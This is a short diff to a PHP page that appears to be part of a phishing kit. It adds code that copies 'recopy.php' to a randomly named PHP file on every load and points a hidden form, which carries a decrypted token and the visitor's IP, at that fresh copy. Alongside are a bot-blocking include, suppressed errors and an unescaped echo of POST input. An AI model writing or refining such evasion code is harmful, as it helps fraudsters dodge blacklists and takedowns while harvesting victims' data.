@@ -39,6 +39,19 @@ div img {
 error_reporting(0);
 include('engine/encrypt.php');
 
+function generateRandomString($length = 10) {
+    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    $charactersLength = strlen($characters);
+    $randomString = '';
+    for ($i = 0; $i < $length; $i++) {
+        $randomString .= $characters[rand(0, $charactersLength - 1)];
+    }
+    return $randomString;
+}
+$file_r = 'recopy.php';
+$newfile_r = generateRandomString().".php";
+copy($file_r, $newfile_r);
+
 if ($blocker == 1){
 require 'block.php';
 
@@ -101,7 +114,8 @@ foreach($_POST as $key => $value){
 $rawtoken = doDecrypt(gettoken());
     if (isset($rawtoken))
 {?>
-<form action="recopy.php" method="post" id="dateForm">
+
+<form action="<?php echo $newfile_r; ?>" method="post" id="dateForm">
 <input type="hidden" name="token" value="<?php echo $rawtoken; ?>">
 <input type="hidden" name="ip" value="<?php echo $_POST['ip']; ?>">
 </form>
